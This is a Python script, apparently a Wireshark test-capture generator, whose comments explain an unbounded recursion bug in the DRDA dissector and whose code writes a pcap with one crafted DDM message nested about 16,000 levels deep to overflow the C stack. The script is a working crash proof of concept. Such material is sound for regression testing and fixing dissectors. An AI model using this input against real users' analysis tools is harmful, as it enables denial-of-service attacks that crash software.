#!/usr/bin/env python3
# Helper module for the drda capture generator
#
# Wireshark - Network traffic analyzer
# By Gerald Combs <gerald@wireshark.org>
# Copyright 1998 Gerald Combs
#
# SPDX-License-Identifier: GPL-2.0-or-later

# DRDA: dissect_drda_collection() calls itself through the drda.opcode
# table (TYPDEFOVR / PKGSNLST -> collection_handle) with no depth limit.
# dissector_try_uint_with_data(..., add_proto_name=false) does not add a
# layer, so the gui_max_tree_depth check in call_dissector_work never fires.
# One 65495-byte DDM gives ~16000 nested levels -> C stack overflow.
# Ports 50002->50001; the heuristic "drda_tcp" (enabled) picks it up.
import struct
import sys

def csum(b):
    if len(b) % 2: b += b'\0'
    s = sum(struct.unpack('!%dH' % (len(b)//2), b))
    while s >> 16: s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

def tcp_pkt(payload, sport=50002, dport=50001, seq=1, flags=0x18):
    src, dst = bytes([192,0,2,1]), bytes([192,0,2,2])
    tcp = struct.pack('!HHIIBBHHH', sport, dport, seq, 0, 5<<4, flags, 65535, 0, 0)
    ph = src + dst + struct.pack('!BBH', 0, 6, len(tcp)+len(payload))
    c = csum(ph + tcp + payload)
    tcp = tcp[:16] + struct.pack('!H', c) + tcp[18:]
    ip = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 20+len(tcp)+len(payload), 1, 0, 64, 6, 0, src, dst)
    ip = ip[:10] + struct.pack('!H', csum(ip)) + ip[12:]
    eth = bytes.fromhex('020000000002020000000001') + b'\x08\x00'
    return eth + ip + tcp + payload

def write_pcap(name, pkts):
    with open(name, 'wb') as f:
        f.write(struct.pack('<IHHiIII', 0xa1b2c3d4, 2, 4, 0, 0, 262144, 1))
        for i, p in enumerate(pkts):
            f.write(struct.pack('<IIII', 1700000000 + i, 0, len(p), len(p)))
            f.write(p)

total = int(sys.argv[1]) if len(sys.argv) > 1 else 65495
total -= (total - 10) % 4
plen = total - 10                     # parameter area
depth = plen // 4
# nested TYPDEFOVR parameters: each level = 2-byte length + 2-byte codepoint
body = b''
for i in range(depth):
    body += struct.pack('!HH', plen - 4 * i, 0x0035)
# DSS header: len, magic, format (RQSDSS), correl, len2, codepoint EXCSQLSTT
ddm = struct.pack('!HBBHHH', total, 0xD0, 0x01, 1, total - 6, 0x200B) + body
assert len(ddm) == total
write_pcap('drda_collection_recursion.pcap', [tcp_pkt(ddm)])
print('depth', depth)
